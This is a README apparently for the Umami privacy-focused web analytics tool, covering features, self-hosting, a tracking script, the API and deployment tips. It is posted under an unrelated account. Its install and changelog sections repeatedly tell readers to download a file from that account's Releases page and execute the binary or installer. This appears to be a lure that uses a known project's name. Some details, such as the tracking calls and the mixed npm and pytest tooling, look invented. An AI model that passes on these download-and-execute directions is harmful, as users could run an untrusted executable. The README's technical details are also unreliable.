# Umami — Privacy-Focused Web Analytics, Charts, Metrics, and Reports

[![Releases](https://img.shields.io/github/v/release/kierykatana/umami?label=Releases&color=2b8a3e)](https://github.com/kierykatana/umami/releases)

[![analytics](https://img.shields.io/badge/topic-analytics-blue)](https://github.com/topics/analytics) [![charts](https://img.shields.io/badge/topic-charts-orange)](https://github.com/topics/charts) [![google-analytics](https://img.shields.io/badge/topic-google--analytics-red)](https://github.com/topics/google-analytics) [![statistics](https://img.shields.io/badge/topic-statistics-yellowgreen)](https://github.com/topics/statistics) [![web-analytics](https://img.shields.io/badge/topic-web--analytics-violet)](https://github.com/topics/web-analytics)

![Hero: analytics chart](https://images.unsplash.com/photo-1559526324-593bc073d938?w=1200&q=80&auto=format&fit=crop)

Umami is a modern, privacy-focused alternative to Google Analytics. It tracks visits, events, and goals without personal data. You get fast charts, event hooks, and clean APIs. Deploy it on your server or on a small VPS. The project focuses on low overhead, strong privacy defaults, and clear metrics.

Table of Contents
- Features
- Quick demo
- Screenshots
- Install (binary / container)
- Quick start (self-host)
- Tracking API
- Data model and storage
- Charts and dashboards
- Deployment tips
- Integrations
- Contributing
- License
- Releases (download)

Features
- Lightweight tracker script. Add one small JavaScript file to your site.
- Event tracking. Track clicks, downloads, forms, and conversions.
- Goals. Configure goals and see conversion rate over time.
- Real-time and historical charts. Views, unique visitors, referrers, pages.
- Privacy by default. No cookies. No tracking of personal data. IPs can be anonymized.
- Self-host friendly. Bring your own server and database.
- API-first. Simple REST API for custom queries and exports.
- Small footprint. Low memory and CPU use.
- Chart-ready. Data exports for Chart.js, D3, or any chart library.

Quick demo
- View the dashboard to see visits by day, top pages, and referrers.
- Click any chart to filter by date range.
- Use the event table to slice by event name or page.

Screenshots
- Dashboard (daily and hourly charts)
- Event detail view
- Page list with engagement

(Use your own screenshots in the repo /assets/screenshots directory. Pick PNG or SVG to keep clarity.)

Install (binary / container)
- Recommended: use the release package for your platform.
- Visit the Releases page and download the package for your system. The file in that release needs to be downloaded and executed. Use the binary or installer script provided there: https://github.com/kierykatana/umami/releases

The Releases badge at the top links directly to the same page.

Quick start (self-host)
1. Pick a host: small VPS, Docker host, or managed server.
2. Create a PostgreSQL or MySQL database and a user.
3. Set environment variables:
   - DATABASE_URL (postgres://user:pass@host:port/dbname)
   - UMAMI_BASE_URL (https://analytics.example.com)
   - SECRET_KEY (random 32+ char value)
4. Run migrations. The release package or container image includes a migration script.
5. Start the server and open the web UI.
6. Add a site and copy the tracking script.

Example docker-compose (high level)
- web: Umami app image
- db: Postgres
- volume: persistent data

Tracking script
- Add this script to your site header:
  <script async src="https://analytics.example.com/umami.js"></script>
  <script>
    umami('init', 'SITE_ID');
  </script>
- Track an event:
  umami('event', 'download', {url: '/files/report.pdf'});

The script sends compact payloads. The server records timestamp, path, referrer, screen size, and event metadata. It drops any personal identifiers by default.

API and SDK
- REST endpoints for sites, events, visitors, and goals.
- Example: GET /api/sites/{id}/stats?from=2025-01-01&to=2025-01-31
- Export CSV or JSON for reports.
- Webhooks: push event data to your pipeline.

Data model and storage
- Visits table: site_id, visitor_hash, page_path, referrer, created_at.
- Events table: site_id, event_name, metadata, created_at.
- Goals table: site_id, slug, type, value.
- Indexes on created_at and site_id keep queries fast.

Charts and dashboards
- Built-in charts: line, bar, pie, and stacked area.
- Use query endpoints to feed Chart.js or D3.
- The UI exposes presets:
  - Active visitors
  - Views by page
  - Referrers list
  - Event funnel
- Export PNG or CSV for slide decks.

Deployment tips
- Use HTTPS. Provide a valid TLS certificate for the base URL.
- Scale horizontally: run multiple app instances behind a load balancer.
- Use a managed database for production.
- Enable log rotation for access and error logs.
- Monitor database size and vacuum regularly (Postgres).
- Run backups on a schedule.

Performance
- Use local caching for static assets.
- Keep the tracking script under 2 KB gzipped.
- Batch heavy read queries for reports to a read replica.

Security
- Protect admin UI with strong passwords.
- Rotate SECRET_KEY on scheduled intervals.
- Limit public API keys to read-only for public dashboards.

Integrations
- Slack webhooks for alerts.
- CSV export for BI tools.
- Zapier/IFTTT adapter via webhooks.
- SSO support via OAuth2 (community plugin).

Developer guide
- Repo layout:
  - /server — backend code and API
  - /web — frontend UI and assets
  - /migrations — DB migration scripts
  - /docs — extra docs and examples
- Run tests:
  - unit tests via npm or pytest depending on component
  - integration tests use a test DB instance
- Local dev:
  - Copy .env.example to .env
  - Start local Postgres or MySQL
  - Run migrations
  - npm run dev or ./start-dev.sh

Contributing
- Fork the repo and open a pull request.
- Use feature branches and keep commits small.
- Write tests for new features.
- Follow the code style and run linters before push.
- Add docs for any public API change.

Roadmap (examples)
- more visualization types
- user cohorts and retention
- advanced funnel analysis
- first-party integrations for CMS

FAQ
- Q: Does Umami use cookies?
  A: By default, no. You can enable optional cookies.
- Q: Can I anonymize IPs?
  A: Yes. Enable IP masking in config.
- Q: Does it collect email or names?
  A: It never stores personal data unless you send it via events.

Changelog and Releases
- Check the Releases page for binaries, installer scripts, and change logs.
- Each release includes a packaged installer or binary. Download the file for your platform and execute the included installer or binary from the release assets. This step installs the app and runs any migration scripts.
- Downloads and release notes are here: https://github.com/kierykatana/umami/releases

Support
- Open issues on the main repo for bugs and feature requests.
- Use Discussions for help and ideas.
- Submit PRs for code or docs.

Acknowledgments and resources
- Inspired by open-source analytics projects and privacy-first design.
- Chart rendering uses common libraries like Chart.js.
- Use these resources when building or customizing:
  - Chart.js docs
  - PostgreSQL tuning guides
  - Common web security best practices

License
- This project uses an open-source license. Check LICENSE in the repo for terms.

Badges (add to README)
- CI, Coverage, License, and Release badges help communicate status.

How to publish your own dashboard
- Create a site entry in the admin.
- Copy the script snippet to the pages you manage.
- Use site filters to segment by hostname, path, or custom metadata.
- Create a public dashboard by generating a read-only API key and embedding charts.

Maintenance checklist
- Monitor database growth monthly.
- Update dependencies quarterly.
- Review access logs and rotate keys every 90 days.

Contact
- Use GitHub Issues for tracking bugs.
- Use PRs for code contributions.
- Use Discussions for feature conversations.

Footer image
![Small analytics icon](https://raw.githubusercontent.com/github/explore/main/topics/analytics/analytics.png)